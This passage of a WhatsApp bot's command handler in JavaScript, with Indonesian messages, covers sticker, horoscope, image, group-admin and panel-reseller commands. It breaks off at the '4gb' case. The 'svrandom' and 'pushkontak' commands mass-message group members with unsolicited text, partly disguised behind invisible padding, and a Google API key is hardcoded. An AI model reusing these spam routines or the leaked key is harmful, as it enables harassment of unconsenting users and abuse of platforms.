if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await KhaerulZx.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'gcbot': {
reply(`- Gc Utama
https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
await KhaerulZx.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/gcbot.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
//=================================================//
case 'emojimix2': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await KhaerulZx.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 if (!text) throw `Example : ${prefix + command} HW MODS WA, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return m.reply(anu.message)
 KhaerulZx.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
case 'svrandom': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`khusus di grup`)
  let more = String.fromCharCode(8206);
  let readmore = more.repeat(4800)
  let member = participants.map(u => u.id)
            let woilah1 = member[Math.floor(Math.random() * member.length)]
            let woilah2 = member[Math.floor(Math.random() * member.length)]
let woilah3 = member[Math.floor(Math.random() * member.length)]
            let woilah4 = member[Math.floor(Math.random() * member.length)]
let woilah5 = member[Math.floor(Math.random() * member.length)]
  let kanjut = `Mau gak jadi pacarku?${readmore}\nmaaf bang/kak\nizin pushkontak\npliss sv ${ownername}`
  await reply("Done Bang")
  await sleep(2000)
  await KhaerulZx.sendMessage(woilah1, { text: kanjut })
  await sleep(5000)
  await KhaerulZx.sendMessage(woilah2, { text: kanjut })
  await sleep(5000)
  await KhaerulZx.sendMessage(woilah3, { text: kanjut })
  await sleep(5000)
  await KhaerulZx.sendMessage(woilah4, { text: kanjut })
  await sleep(5000)
  await KhaerulZx.sendMessage(woilah5, { text: kanjut })
  await sleep(5000)
}
break
case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await KhaerulZx.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
KhaerulZx.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
KhaerulZx.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case "cekidgc": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.premium)
let getGroups = await KhaerulZx.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await KhaerulZx.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'hadist': {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`*☘️ Example :* ${prefix + command} abu-dawud 1`)
let hadist = args[0]
let nomer = args[1]
try {
let apiUrl = `https://hadis-api-id.vercel.app/hadith/${hadist}/${nomer}`
let response = await axios.get(apiUrl)
let data = response.data
reply(`*乂 HADIST ${data.name.toUpperCase()}*
${data.arab}

*Translation:* ${data.id}`)
} catch (e) {
console.error(e)
}}
break
case 'getidgc':
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await KhaerulZx.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'join': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await KhaerulZx.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
        break
        case 'removebg2': case 'nobg2':{
        if (banned.includes(m.sender)) {
    return;
    }
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
let data = await anu.json()
await KhaerulZx.sendMessage(m.chat, {image: {url: data.url.result}, caption: mess.done}, {quoted:m})
}
break
case 'capcut':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await KhaerulZx.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
KhaerulZx.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: mess.done}, {quoted: m})
await KhaerulZx.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await KhaerulZx.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
        case 'group': {   
        if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ʙᴜᴋᴀɴ ᴀᴅᴍɪɴ')
await loading()
if (args[0] === 'tutup group'){
await KhaerulZx.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'buka group'){
await KhaerulZx.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
KhaerulZx.sendMessage(m.chat, { image: ppnyauser, caption: `ᴄᴏɴᴛᴏʜ ; .ꜰɪɴꜱɪɪ ᴛᴜᴛᴜᴘ ɢʀᴏᴜᴘ
ᴄᴏɴᴛᴏʜ : .ꜰɪɴꜱɪɪ ʙᴜᴋᴀ ɢʀᴏᴜᴘ`}, {quoted:m}) 
 }
}
break

//=================================================//
case 'google': {
if (banned.includes(m.sender)) {
    return;
    }
 if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'couple': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
KhaerulZx.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
KhaerulZx.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
//=================================================//
case 'coffe': case 'kopi': {
if (banned.includes(m.sender)) {
    return;
    }
await loading()
KhaerulZx.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}
break
//=================================================//
case 'getname': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*khusus Premium*')
await loading()
if (qtod === "true") {
namenye = await KhaerulZx.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
KhaerulZx.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ*')
await loading()
if (qtod === "true") {
try {
pporg = await KhaerulZx.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
KhaerulZx.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await KhaerulZx.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
KhaerulZx.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break


//=================================================//
case "setppbot": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await KhaerulZx.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await KhaerulZx.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await KhaerulZx.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await KhaerulZx.downloadAndSaveMediaMessage(m)
await KhaerulZx.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break
//=================================================//
case 'block': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await KhaerulZx.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('ᴋʜᴜsᴜs ꜰɪɴꜱɪɪ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await KhaerulZx.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'jadiloli': {
if (banned.includes(m.sender)) {
    return;
    }
const { shannzCdn } = require('./lib/shannzCdn.js');
if (!isPrem) return reply('khusus prem')
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
try {
reply(mess.wait)
let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
let anu = await shannzCdn(media);
KhaerulZx.sendMessage(m.chat, { image: { url: `https://api.nyxs.pw/ai-image/jadiloli?url=${anu}` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case "jame": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isPrem) return reply('khusus prem');
    if (!quoted) return reply(`Fotonya Mana?`);
    if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`);
    try {
        reply(mess.wait);
        let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
        
        // Menggunakan fungsi uploadUguu
        let uploadResult = await uploadUguu(media);
        if (uploadResult.status === 'Done') {
            // Membuat URL untuk gambar yang diupload
            const apiUrl = `https://api.nyxs.pw/ai-image/jadianime?url=${uploadResult.result}`;
            
            // Kirim gambar yang diupload
            KhaerulZx.sendMessage(m.chat, { image: { url: apiUrl }, caption: 'Selesai' }, { quoted: m });
        } else {
            reply('Gagal mengunggah gambar.');
        }

        // Menghapus file media setelah diupload
        fs.unlinkSync(media);
    } catch (error) {
        console.error(error); // Log error untuk debugging
        reply('Yah, Error kak. Laporkan ke owner agar diperbaiki');
    }
}
break;
/*case 'jame': {
const { shannzCdn } = require('./lib/shannzCdn.js');
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`)
  reply(mess.wait)
  let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
  let shz = await shannzCdn(media);
  let cdn = shz.result.url;
  let proses = await (await fetch('https://api.nyxs.pw/ai-image/jadianime?url=' + cdn)).json();
  let imge = proses.result.data;
  KhaerulZx.sendMessage(m.chat, { image: { url: imge.downloadUrls[0] }, caption: '*SUCCESS ✅*'}, { quoted: m})
}
break*/

//=================================================//

//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
KhaerulZx.sendImage(from, data.url, 'Success Coy', m)
})
break
// BATAS CPANEL V2 DAN V1\\
case '1gb': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "1100";
    let cpu = "0";
    let disk = "1100";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "2gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "2200";
    let cpu = "0";
    let disk = "2200";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "3gb": {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isSeller) return reply('Khusus reseller!');
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan:\n${prefix + command} user,nomer`);
    let username = t[0];
    let u = t[1] + '@s.whatsapp.net';
    let name = username;
    let egg = global.eggsnya;
    let loc = global.location;
    let memo = "3200";
    let cpu = "0";
    let disk = "3200";
    let email = username + "1398@gmail.com";
    akunlo = "https://telegra.ph/file/74f26656f3f88627dbfeb.jpg"; 
    if (!u) return;
    let d = (await KhaerulZx.onWhatsApp(u.split`@`[0]))[0] || {};
    function generateRandomPassword(length) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let password = "";
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * chars.length);
            password += chars[randomIndex];
        }
        return password;
    }
    let password = generateRandomPassword(12);
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    });
    let data = await f.json();
    if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes;
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    });
    m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`);
    let ctf = `
*Berikut adalah data panel Anda*
*DARI @${m?.sender.split('@')[0]}*

┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *RAM :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *LOGIN :* ${global.domain}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GARANSI? BAWA BUKTI TF*
`;
    await KhaerulZx.sendMessage(u, { text: ctf });
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup;

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꜰɪɴꜱɪɪ",
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    });
    let res = await f3.json();
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2));
    let server = res.attributes;
    await m.reply(`
*Sukses Membuat Panel dan Server ✅*
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim Ke @${u.split`@`[0]} Bang ${pushname}`);
}
break;
case "4gb": {
    if (banned.includes(m.sender)) {
        return;
    }
